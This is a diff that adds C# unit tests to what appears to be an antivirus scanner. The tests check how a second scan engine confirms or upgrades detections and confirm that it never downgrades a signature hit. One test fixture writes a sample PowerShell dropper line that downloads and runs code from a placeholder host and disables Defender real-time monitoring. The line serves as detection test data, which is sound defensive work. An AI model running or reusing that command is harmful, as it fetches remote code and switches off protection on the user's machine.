@@ -255,3 +255,50 @@ public class HeuristicIntegrationTests
     }
 }
 
+
+public class SecondOpinionTests
+{
+    private sealed class FixedFileEngine(Verdict verdict, string? name) : UScan.Core.Engines.IFileScanEngine
+    {
+        public int Calls;
+        public string Id => "second";
+
+        public Task<EngineResult> ScanFileAsync(string path, CancellationToken cancellationToken)
+        {
+            Interlocked.Increment(ref Calls);
+            return Task.FromResult(new EngineResult(verdict, Id, name, null));
+        }
+    }
+
+    [Fact]
+    public async Task Second_engine_runs_only_for_detections_and_upgrades_heuristic_hits()
+    {
+        using var dir = new TempDir();
+        dir.Write("dropper.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x.invalid/p'); Set-MpPreference -DisableRealtimeMonitoring $true");
+        dir.Write("clean.txt", "hello");
+        var second = new FixedFileEngine(Verdict.Infected, "Second.Signature");
+
+        var report = await new ScanRunner(new FakeEngine(), new ScanOptions { Heuristics = [new ScriptAnalyzer()], SecondOpinion = second })
+            .RunAsync([dir.Path], cancellationToken: TestContext.Current.CancellationToken);
+
+        Assert.Equal(1, second.Calls);
+        var d = Assert.Single(report.Files, f => f.Path.EndsWith("dropper.ps1", StringComparison.Ordinal));
+        Assert.Equal(Verdict.Infected, d.Verdict);
+        Assert.Equal("Second.Signature", d.DetectionName);
+        Assert.Equal(3, d.EngineResults.Count);
+    }
+
+    [Fact]
+    public async Task Clean_second_opinion_never_downgrades_a_signature_detection()
+    {
+        using var dir = new TempDir();
+        dir.Write("eicar.com", TestFiles.Eicar);
+        var report = await new ScanRunner(new FakeEngine(), new ScanOptions { SecondOpinion = new FixedFileEngine(Verdict.Clean, null) })
+            .RunAsync([dir.Path], cancellationToken: TestContext.Current.CancellationToken);
+
+        var r = Assert.Single(report.Files);
+        Assert.Equal(Verdict.Infected, r.Verdict);
+        Assert.Equal("Fake.EICAR", r.DetectionName);
+        Assert.Contains(r.EngineResults, e => e.EngineId == "second" && e.Verdict == Verdict.Clean);
+    }
+}
